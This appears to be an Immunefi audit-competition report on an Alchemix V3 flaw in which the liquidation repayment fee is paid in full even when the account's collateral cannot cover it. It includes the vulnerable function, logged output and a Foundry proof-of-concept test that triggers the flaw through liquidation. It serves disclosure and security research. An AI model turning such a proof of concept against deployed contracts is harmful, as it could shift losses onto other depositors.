# 58306 sc critical repayment fee not adjusted for insufficient collateral

**Submitted on Nov 1st 2025 at 06:28:12 UTC by @JoeMama for** [**Audit Comp | Alchemix V3**](https://immunefi.com/audit-competition/alchemix-v3-audit-competition)

* **Report ID:** #58306
* **Report Type:** Smart Contract
* **Report severity:** Critical
* **Target:** <https://github.com/alchemix-finance/v3-poc/blob/immunefi\\_audit/src/AlchemistV3.sol>
* **Impacts:**
  * Contract fails to deliver promised returns, but doesn't lose value

## Description

## Brief/Intro

During liquidation, `_forceRepay` will try to reduce the debt. If the debt is cleared or the debt ratio becomes healthy again, the repayment fee for the caller is recalculated based on the new debt. However, this fee could be larger than the remaining collateral balance, meaning the collateral cannot fully cover the fee.

## Vulnerability Details

The problem lies in `_resolveRepaymentFee`. It calculates the repayment fee from the debt and tries to deduct it from the collateral balance. However, even if the collateral isn’t enough to cover the full fee, the function still returns the total fee amount.

```
    function _resolveRepaymentFee(uint256 accountId, uint256 repaidAmountInYield) internal returns (uint256 fee) {
        Account storage account = _accounts[accountId];
        // calculate repayment fee and deduct from account
        fee = repaidAmountInYield * repaymentFee / BPS; // 1%

        account.collateralBalance -= fee > account.collateralBalance ? account.collateralBalance : fee;
        emit RepaymentFee(accountId, repaidAmountInYield, msg.sender, fee);
        return fee;
    }
```

## Impact Details

If the full fee cannot be deducted from the collateral, the collateral balance becomes insufficient to cover it. As a result, other users may end up paying part of the fee.

## Link to Proof of Concept

<https://gist.github.com/hexens-joe/564f4927c57da0d0dacb776c4a5a5733>

## Proof of Concept

## Proof of Concept

please run the gist with `forge test --mt testRepaymentFeeTakenFromAlchemist -vv`

During this poc, console log was added to the relevant `_resolveRepaymentFee` function

```
    function _resolveRepaymentFee(uint256 accountId, uint256 repaidAmountInYield) internal returns (uint256 fee) {
        Account storage account = _accounts[accountId];
        // calculate repayment fee and deduct from account
        fee = repaidAmountInYield * repaymentFee / BPS; 
        console.log("account.collateralBalance",account.collateralBalance);
        console.log("fee",fee);
        account.collateralBalance -= fee > account.collateralBalance ? account.collateralBalance : fee;
        emit RepaymentFee(accountId, repaidAmountInYield, msg.sender, fee);
        return fee;
    }
```

The outputs:

```
"account.collateralBalance", 73874824921256343 [7.387e16]) 
"fee", 126612517507874365 [1.266e17])
```

Meaning the fee was more than collateralBalance, but still returned the full fee amount to be send to the caller.

```
   function testRepaymentFeeTakenFromAlchemist() external {
        vm.prank(alOwner);
        alchemist.setRepaymentFee(1000); // 10% for simplciity

        depositAmount = 1e18;
        vm.startPrank(yetAnotherExternalUser);
        SafeERC20.safeApprove(address(vault), address(alchemist), depositAmount * 100);
        alchemist.deposit(depositAmount * (100), yetAnotherExternalUser, 0);
        vm.stopPrank();

        vm.startPrank(address(0xbeef));
        SafeERC20.safeApprove(address(vault), address(alchemist), depositAmount * 14);
        alchemist.deposit(1.34e18, address(0xbeef), 0);

    
        uint256 tokenIdFor0xBeef = AlchemistNFTHelper.getFirstTokenId(address(0xbeef), address(alchemistNFT));
        alchemist.mint(tokenIdFor0xBeef, 1.2e18, address(0xbeef));
        vm.stopPrank();

        uint256 tokenId2 = AlchemistNFTHelper.getFirstTokenId(address(yetAnotherExternalUser), address(alchemistNFT));

        vm.startPrank(yetAnotherExternalUser);
        IERC20(alToken).approve(address(transmuterLogic), 1000e18);
        SafeERC20.safeApprove(address(vault), address(alchemist), 1000e18);
        alchemist.mint(tokenId2, depositAmount * 85, address(yetAnotherExternalUser));

        IERC20(alToken).approve(address(transmuterLogic), depositAmount * 85);
        IERC20(address(vault)).approve(address(alchemist), 100_000e18);
        transmuterLogic.createRedemption(depositAmount * 85); // create earmark to cover debt of other user.
        vm.roll(block.number + transmuterLogic.timeToTransmute() + 1000);
        alchemist.poke(tokenIdFor0xBeef);

        // modify yield token price via modifying underlying token supply
        uint256 initialVaultSupply = IERC20(address(mockStrategyYieldToken)).totalSupply();
        IMockYieldToken(mockStrategyYieldToken).updateMockTokenSupply(initialVaultSupply);
        // increasing yeild token suppy by 2000 bps or 0% while keeping the unederlying supply unchanged
        uint256 modifiedVaultSupply = ((initialVaultSupply * 700) / 10_000) + initialVaultSupply;
        IMockYieldToken(mockStrategyYieldToken).updateMockTokenSupply(modifiedVaultSupply);

        vm.startPrank(externalUser);
        (, uint256 feeInYield,) = alchemist.liquidate(tokenIdFor0xBeef);
        console.log("feeInYield", feeInYield); // returns 1.126612517507874365 [1.266e17] while collateral to pay for this was 73874824921256343 [7.387e16].
    }
```
